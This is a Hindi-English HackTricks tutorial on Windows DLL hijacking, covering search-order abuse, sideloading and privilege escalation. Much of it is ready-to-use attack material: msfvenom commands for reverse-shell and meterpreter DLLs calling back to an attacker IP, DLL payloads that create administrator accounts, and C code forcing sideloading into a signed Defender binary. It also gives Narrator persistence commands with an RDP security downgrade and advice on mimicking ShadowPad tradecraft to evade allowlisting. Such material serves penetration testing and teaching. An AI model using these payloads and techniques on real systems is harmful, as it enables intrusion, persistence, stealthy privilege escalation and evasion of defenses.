# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## मूल जानकारी

DLL Hijacking में एक विश्वसनीय एप्लिकेशन को एक malicious DLL लोड कराने के लिए मैनीपुलेट करना शामिल है। यह शब्द कई रणनीतियों को समाहित करता है जैसे **DLL Spoofing, Injection, and Side-Loading**। इसे मुख्यतः code execution, persistence हासिल करने और कम सामान्य रूप से privilege escalation के लिए उपयोग किया जाता है। यद्यपि यहाँ ध्यान escalation पर है, hijacking की विधि उद्देश्य के अनुसार समान रहती है।

### सामान्य तकनीकें

कई तरीके DLL hijacking के लिए उपयोग किए जाते हैं, जिनकी प्रभावशीलता उस एप्लिकेशन के DLL लोडिंग स्ट्रेटेजी पर निर्भर करती है:

1. **DLL Replacement**: एक वास्तविक DLL को malicious वाले से बदलना, वैकल्पिक रूप से मूल DLL की कार्यक्षमता बनाए रखने के लिए DLL Proxying का उपयोग करना।
2. **DLL Search Order Hijacking**: दुर्भावनापूर्ण DLL को उस search path में उस वैध DLL से पहले रख देना, ताकि एप्लिकेशन के search पैटर्न का फायदा उठाया जा सके।
3. **Phantom DLL Hijacking**: एक malicious DLL बनाना जिसे एप्लिकेशन लोड करे क्योंकि वह समझता है कि वह आवश्यक DLL मौजूद नहीं है।
4. **DLL Redirection**: `%PATH%` या `.exe.manifest` / `.exe.local` फाइलों जैसे search पैरामीटर बदलकर एप्लिकेशन को malicious DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS डायरेक्टरी में वैध DLL को malicious कॉपी से बदलना, यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: एप्लिकेशन की कॉपी के साथ user-controlled डायरेक्टरी में malicious DLL रखना, जो Binary Proxy Execution तकनीकों जैसा होता है।

> [!TIP]
> DLL sideloading के ऊपर HTML staging, AES-CTR configs, और .NET implants को layer करने वाली step-by-step chain के लिए नीचे दिए गए workflow की समीक्षा करें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing DLLs ढूँढना

सिस्टम में missing DLLs खोजने का सबसे आम तरीका sysinternals का [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना है, और निम्नलिखित 2 filters सेट करना:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाएँ:

![](<../../../images/image (153).png>)

यदि आप सामान्य तौर पर **missing dlls** खोज रहे हैं तो इसे कुछ seconds के लिए चलने दें.\
यदि आप किसी specific executable के अंदर **missing dll** खोज रहे हैं तो आपको **Process Name** "contains" `<exec name>` जैसा एक और filter सेट करना चाहिए, उसे execute करें, और events capture करना बंद कर दें।

## Missing Dlls का exploit करना

privilege escalate करने के लिए, हमारी सबसे अच्छी संभावना यह है कि हम ऐसी जगह पर एक dll लिख सकें जिसे एक privilege process लोड करने की कोशिश करेगा — किसी ऐसी जगहों में जहाँ उसे search किया जाएगा। इसलिए, हम या तो एक फ़ोल्डर में dll लिख पाएँगे जहाँ उस dll को original dll वाली फ़ोल्डर से पहले search किया जाता है (एक अजीब मामला), या हम किसी ऐसी फ़ोल्डर में लिख पाएँगे जहाँ dll search होगा और original dll किसी भी फ़ोल्डर में मौजूद नहीं है।

### DLL खोज क्रम

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) के अंदर आप देख सकते हैं कि DLLs कैसे विशेष रूप से लोड होते हैं।

Windows applications DLLs को pre-defined search paths के एक सेट का पालन करके ढूँढते हैं, और एक विशेष अनुक्रम का पालन करते हैं। DLL hijacking तब उत्पन्न होता है जब एक हानिकारक DLL को रणनीतिक रूप से इन डायरेक्टरियों में से किसी एक में रखा जाता है, जिससे यह असली DLL से पहले लोड हो जाए। इससे बचने का एक तरीका यह है कि सुनिश्चित किया जाए कि एप्लिकेशन जिन DLLs की आवश्यकता है उनके लिए absolute paths का उपयोग करता है।

आप 32-bit सिस्टम्स पर **DLL search order** नीचे देख सकते हैं:

1. उस डायरेक्टरी से जहाँ से application लोड हुई।
2. सिस्टम डायरेक्टरी। इस डायरेक्टरी का path प्राप्त करने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) फ़ंक्शन का उपयोग करें। (_C:\Windows\System32_)
3. 16-bit सिस्टम डायरेक्टरी। इस डायरेक्टरी का path प्राप्त करने के लिए कोई फ़ंक्शन नहीं है, पर यह search किया जाता है। (_C:\Windows\System_)
4. Windows डायरेक्टरी। इस डायरेक्टरी का path प्राप्त करने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) फ़ंक्शन का उपयोग करें। (_C:\Windows_)
5. वर्तमान डायरेक्टरी।
6. वे डायरेक्टरियाँ जो PATH environment variable में सूचीबद्ध हैं। ध्यान दें कि इसमें वह per-application path शामिल नहीं है जिसे **App Paths** registry key द्वारा निर्दिष्ट किया गया है। DLL search path की गणना करते समय **App Paths** key का उपयोग नहीं किया जाता।

यह **default** search order है जब **SafeDllSearchMode** सक्षम है। जब यह अक्षम होता है तो current directory दूसरी जगह आ जाती है। इस फीचर को अक्षम करने के लिए, **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाएं और इसे 0 पर सेट करें (डिफ़ॉल्ट enabled है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) फ़ंक्शन को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ कॉल किया जाता है तो search उस executable module की डायरेक्टरी में शुरू होती है जिसे **LoadLibraryEx** लोड कर रहा है।

अंत में, ध्यान दें कि **एक dll absolute path संकेत करके लोड की जा सकती है न कि केवल नाम देकर**। उस स्थिति में वह dll केवल उसी path में ही search किया जाएगा (यदि उस dll की कोई dependencies हैं, तो उन्हें नाम देकर लोड किए जाने पर आगे खोजा जाएगा)।

खोज क्रम को बदलने के और भी तरीके हैं पर मैं उन्हें यहाँ विस्तार से नहीं बताउंगा।

### RTL_USER_PROCESS_PARAMETERS.DllPath के ज़रिए sideloading मजबूर करना

एक नई बनाई जा रही प्रक्रिया के DLL search path को निर्धारित रूप से प्रभावित करने का एक उन्नत तरीका यह है कि ntdll के native APIs के साथ process बनाते समय RTL_USER_PROCESS_PARAMETERS में DllPath फील्ड सेट किया जाए। यहाँ एक attacker-controlled डायरेक्टरी मुहैया करा कर, एक target process जो किसी imported DLL को नाम से resolve करता है (absolute path न हो और safe loading flags का उपयोग न हो) को उस डायरेक्टरी से malicious DLL लोड करने के लिए मजबूर किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx के साथ process parameters बनाएं और एक custom DllPath प्रदान करें जो आपके controlled फोल्डर की ओर इशारा करता है (उदा., वह डायरेक्टरी जहाँ आपका dropper/unpacker रहता है)।
- RtlCreateUserProcess के साथ प्रक्रिया बनाएं। जब target binary किसी DLL को नाम से resolve करेगा, तो loader resolution के दौरान प्रदान किए गए DllPath को देखेगा, जिससे reliable sideloading सक्षम हो जाएगी भले ही malicious DLL target EXE के साथ colocated न हो।

नोट्स/सीमाएं
- यह केवल बनाई जा रही child process को प्रभावित करता है; यह SetDllDirectory से अलग है, जो केवल वर्तमान प्रक्रिया को प्रभावित करता है।
- लक्ष्य को किसी DLL को नाम से import या LoadLibrary करना चाहिए (absolute path न हो और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग न हो)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS प्राथमिकता बदल सकते हैं।

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

ऑपरेशनल उपयोग का उदाहरण
- अपने DllPath डायरेक्टरी में एक malicious xmllite.dll रखें (जो आवश्यक functions export करे या असली DLL को proxy करे)।
- ऊपर बताए गए तरीके का उपयोग करके उस signed binary को लॉन्च करें जिसे नाम से xmllite.dll खोजने के लिए जाना जाता है। loader द्वारा import को दिए गए DllPath के माध्यम से resolve किया जाता है और यह आपकी DLL को sideload कर देता है।

यह तकनीक in-the-wild देखी गई है ताकि multi-stage sideloading chains को drive किया जा सके: एक प्रारंभिक launcher एक helper DLL गिराता है, जो फिर Microsoft-signed, hijackable binary को spawn करता है और attacker’s DLL को staging directory से लोड करने के लिए कस्टम DllPath सेट करता है।


#### Exceptions on dll search order from Windows docs

Windows दस्तावेज़ों में standard DLL खोज क्रम के कुछ अपवाद दर्शाए गए हैं:

- जब कोई **DLL that shares its name with one already loaded in memory** मिलती है, तो सिस्टम सामान्य खोज को बाइपास कर देता है। इसके बजाय, यह redirection और एक manifest के लिए जाँच करता है, और फिर पहले से memory में मौजूद DLL पर default करता है। **In this scenario, the system does not conduct a search for the DLL**।
- उन मामलों में जहाँ DLL को current Windows version के लिए एक **known DLL** के रूप में पहचाना जाता है, सिस्टम अपने version के known DLL का उपयोग करेगा, साथ ही उसके किसी भी dependent DLLs का भी उपयोग करेगा, और **खोज प्रक्रिया को छोड़ देगा**। रजिस्ट्री की कुंजी HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs इन known DLLs की सूची रखती है।
- यदि किसी **DLL के dependencies हैं**, तो इन dependent DLLs की खोज इस तरह की जाती है जैसे उन्हें केवल उनके **module names** द्वारा संकेत किया गया हो, चाहे प्रारम्भिक DLL को पूर्ण path के माध्यम से पहचाना गया हो या नहीं।

### Escalating Privileges

**आवश्यकताएँ**:

- ऐसे process की पहचान करें जो **different privileges** (horizontal या lateral movement) के तहत चलता है या चलेगा, और जिसमें **DLL नहीं है**।
- सुनिश्चित करें कि उस किसी भी **directory** के लिए आपके पास **write access** हो जहाँ **DLL** की खोज की जाएगी। यह स्थान executable की directory हो सकती है या system path के भीतर कोई directory हो सकती है।

हाँ, आवश्यकताएँ ढूँढना जटिल हैं क्योंकि **by default किसी privileged executable का DLL missing होना ढूँढना अजीब होता है** और system path फोल्डर पर write permissions का होना और भी **ज़्यादा अजीब** है (आपको by default नहीं मिलता)। लेकिन misconfigured वातावरणों में यह संभव है.\
यदि आप भाग्यशाली हैं और आवश्यकताओं को पूरा करते हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट को देख सकते हैं। भले ही प्रोजेक्ट का **main goal bypass UAC** हो, वहाँ आप उस Windows version के लिए Dll hijacking का एक **PoC** पा सकते हैं जिसका आप उपयोग कर सकते हैं (शायद बस उस फ़ोल्डर के पथ को बदलकर जहाँ आपके पास write permissions हैं)।

ध्यान दें कि आप किसी फ़ोल्डर में **check your permissions** इस तरह कर सकते हैं:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फ़ोल्डरों की permissions जाँचें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप किसी executable के imports और किसी dll के exports को भी निम्न के साथ जांच सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### स्वचालित उपकरण

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जांचेगा कि system PATH के किसी भी फोल्डर पर आपके पास लिखने की अनुमति है या नहीं।\
इस भेद्यता का पता लगाने के लिए अन्य उपयोगी स्वचालित उपकरण **PowerSploit functions** हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll_।

### उदाहरण

यदि आप कोई exploitable scenario पाते हैं तो इसे सफलतापूर्वक एक्सप्लॉइट करने के लिए सबसे महत्वपूर्ण चीज़ों में से एक यह है कि आप एक dll बनाएं जो कम से कम उन सभी functions को export करे जिन्हें executable उससे import करेगा। साथ ही, ध्यान दें कि Dll Hijacking उपयोगी होता है [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)। आप execution के लिए dll hijacking पर केंद्रित इस अध्ययन में यह उदाहरण पा सकते हैं कि **एक वैध dll कैसे बनाएं**: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
इसके अलावा, अगले अनुभाग में आप कुछ **basic dll codes** पा सकते हैं जो टेम्पलेट्स के रूप में उपयोगी हो सकते हैं या ऐसी **dll** बनाने के लिए जिनमें अनिवार्य न होने वाले functions export किए गए हों।

## **Dlls बनाना और कंपाइल करना**

### **Dll Proxifying**

मूल रूप से एक **Dll proxy** एक ऐसा Dll होता है जो लोड होने पर आपका malicious code execute कर सके, और साथ ही वास्तविक लाइब्रेरी को सभी कॉल्स relay करके अपेक्षित व्यवहार भी बरकरार रखे।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) टूल का उपयोग करके आप किसी executable को चुनकर वह library select कर सकते हैं जिसे आप proxify करना चाहते हैं और एक proxified dll generate कर सकते हैं, या Dll निर्दिष्ट करके एक proxified dll generate कर सकते हैं।

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 — मैंने x64 संस्करण नहीं देखा):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में आप द्वारा compile की गई Dll को उन फ़ंक्शनों को **export several functions** करना आवश्यक होता है जिन्हें victim process द्वारा लोड किया जाएगा; यदि ये फ़ंक्शंस मौजूद नहीं हैं तो **binary won't be able to load** और **exploit will fail**।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL उदाहरण उपयोगकर्ता निर्माण के साथ</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>वैकल्पिक C DLL थ्रेड एंट्री के साथ</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe अभी भी स्टार्ट पर एक अनुमानित, भाषा-विशिष्ट localization DLL की जाँच करता है जिसे arbitrary code execution और persistence के लिए hijacked किया जा सकता है।

Key facts
- प्रोब पथ (वर्तमान बिल्ड): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- लेगेसी पथ (पुराने बिल्ड): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- यदि OneCore पथ पर एक लिखने योग्य हमलावर-नियंत्रित DLL मौजूद है, तो वह लोड हो जाती है और `DllMain(DLL_PROCESS_ATTACH)` निष्पादित होता है। किसी exports की आवश्यकता नहीं है।

Discovery with Procmon
- फ़िल्टर: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator शुरू करें और ऊपर दिए गए पथ के लोड के प्रयास को देखें।

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- उपरोक्त के साथ, Narrator शुरू करने पर प्लांट किया गया DLL लोड हो जाता है। सुरक्षित डेस्कटॉप (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ।

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- जब RDP session बंद हो जाता है तो execution रुक जाता है—जल्दी से inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप एक built-in Accessibility Tool (AT) registry entry (उदा., CursorIndicator) क्लोन कर सकते हैं, इसे किसी arbitrary binary/DLL की ओर इशारा करने के लिए एडिट करें, इम्पोर्ट करें, और फिर `configuration` को उस AT नाम पर सेट करें। यह Accessibility framework के तहत arbitrary execution को proxy करता है।

Notes
- `%windir%\System32` के अंतर्गत लिखने और HKLM वैल्यूज़ बदलने के लिए admin rights की आवश्यकता होती है।
- सारी payload लॉजिक `DLL_PROCESS_ATTACH` में रह सकती है; कोई exports आवश्यक नहीं हैं।

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` हर दिन सुबह 9:30 बजे लॉग-ऑन उपयोगकर्ता के context में रन होती है।
- **Directory Permissions**: `CREATOR OWNER` द्वारा writable, जिससे local users arbitrary files डाल सकते हैं।
- **DLL Search Behavior**: सबसे पहले उसकी working directory से `hostfxr.dll` लोड करने का प्रयास करता है और अगर गायब हो तो "NAME NOT FOUND" लॉग करता है, जो local directory search precedence को दर्शाता है।

### Exploit Implementation

एक attacker समान डायरेक्टरी में एक malicious `hostfxr.dll` stub रख सकता है, missing DLL का फायदा उठाकर उपयोगकर्ता के context में code execution प्राप्त करने के लिए:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. एक सामान्य उपयोगकर्ता के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में डालें।
2. निर्धारित कार्य के वर्तमान उपयोगकर्ता संदर्भ में सुबह 9:30 बजे चलने की प्रतीक्षा करें।
3. यदि कार्य के निष्पादन के समय कोई प्रशासक लॉग इन है, तो दुर्भावनापूर्ण DLL प्रशासक के सत्र में medium integrity पर चलेगी।
4. medium integrity से SYSTEM privileges तक उन्नयन करने के लिए मानक UAC bypass तकनीकों का उपयोग करें।

## केस स्टडी: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

हमलावर अक्सर MSI-based droppers को DLL side-loading के साथ जोड़ते हैं ताकि वे किसी विश्वसनीय, signed process के तहत payloads निष्पादित कर सकें।

Chain overview
- उपयोगकर्ता MSI डाउनलोड करता है। GUI install के दौरान एक CustomAction चुपचाप चलता है (उदा., LaunchApplication या एक VBScript action), और embedded resources से अगले चरण का पुनर्निर्माण करता है।
- The dropper वैध, signed EXE और एक malicious DLL को समान डायरेक्टरी में लिखता है (उदा. जोड़ी: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- जब signed EXE शुरू होता है, Windows DLL search order working directory से पहले wsc.dll लोड करता है, जिससे attacker का कोड एक signed parent के तहत निष्पादित होता है (ATT&CK T1574.001)।

MSI analysis (what to look for)
- CustomAction table:
- ऐसे entries देखें जो executables या VBScript चलाते हों। संदिग्ध पैटर्न का उदाहरण: LaunchApplication जो बैकग्राउंड में एक embedded file को execute करता है।
- Orca (Microsoft Orca.exe) में, CustomAction, InstallExecuteSequence और Binary tables का निरीक्षण करें।
- MSI CAB में embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- ऐसे कई छोटे fragments देखें जिन्हें जोड़कर और डिक्रिप्ट करके एक VBScript CustomAction द्वारा पुनर्निर्मित किया जाता है। सामान्य प्रवाह:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe के साथ व्यावहारिक sideloading
- इन दोनों फ़ाइलों को उसी फ़ोल्डर में रखें:
- wsc_proxy.exe: वैध साइन किया हुआ होस्ट (Avast). यह प्रोसेस अपनी डायरेक्टरी से नाम के द्वारा wsc.dll लोड करने का प्रयास करता है.
- wsc.dll: attacker DLL. अगर किसी विशिष्ट exports की आवश्यकता नहीं है तो DllMain पर्याप्त हो सकता है; अन्यथा, एक proxy DLL बनाएं और आवश्यक exports को वास्तविक लाइब्रेरी को फॉरवर्ड करते हुए DllMain में payload चलाएँ।
- एक न्यूनतम DLL payload बनाएं:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- एक्सपोर्ट आवश्यकताओं के लिए, एक प्रॉक्सी फ्रेमवर्क (उदा., DLLirant/Spartacus) का उपयोग करें ताकि एक forwarding DLL तैयार किया जा सके जो आपका payload भी execute करे।

- यह तकनीक host binary द्वारा DLL नाम समाधान (DLL name resolution) पर निर्भर करती है। अगर host absolute paths या safe loading flags (उदा., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack विफल हो सकता है।
- KnownDLLs, SxS, और forwarded exports precedence को प्रभावित कर सकते हैं और host binary तथा export सेट चुनते समय इन्हें ध्यान में रखना ज़रूरी है।

## Signed triads + encrypted payloads (ShadowPad केस स्टडी)

Check Point ने बताया कि Ink Dragon कैसे ShadowPad को एक **three-file triad** का उपयोग करके वैध सॉफ़्टवेयर में घुलने-मिलने के लिए deploy करता है जबकि core payload डिस्क पर encrypted रहती है:

1. **Signed host EXE** – vendors जैसे AMD, Realtek, या NVIDIA का दुरुपयोग किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)। अटैकर्स executable का नाम बदलकर इसे Windows बाइनरी जैसा दिखाते हैं (उदा., `conhost.exe`), पर Authenticode signature वैध बनी रहती है।
2. **Malicious loader DLL** – EXE के पास अपेक्षित नाम के साथ drop किया जाता है (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`)। यह DLL आमतौर पर एक MFC binary होता है जो ScatterBrain framework से obfuscate किया गया होता है; इसका एकमात्र काम encrypted blob खोजकर उसे decrypt करना और ShadowPad को reflectively map करना होता है।
3. **Encrypted payload blob** – अक्सर उसी डायरेक्टरी में `<name>.tmp` के रूप में स्टोर किया जाता है। decrypted payload को memory-map करने के बाद loader TMP फाइल को forensic सबूत नष्ट करने के लिए delete कर देता है।

Tradecraft notes:

* Signed EXE का नाम बदलना (जबकि PE header में मूल `OriginalFileName` नहीं बदला गया हो) इसे Windows बाइनरी जैसा दिखने की अनुमति देता है पर vendor signature बनाए रखता है, इसलिए Ink Dragon की आदत — `conhost.exe` जैसा दिखने वाले बाइनरी जो वास्तव में AMD/NVIDIA utilities होते हैं — दोहराएँ।
* चूँकि executable trusted रहता है, अधिकतर allowlisting controls के लिए बस आपका malicious DLL उसके साथ होना ही काफी होता है। loader DLL को कस्टमाइज़ करने पर ध्यान दें; signed parent आमतौर पर बिना बदले चल सकता है।
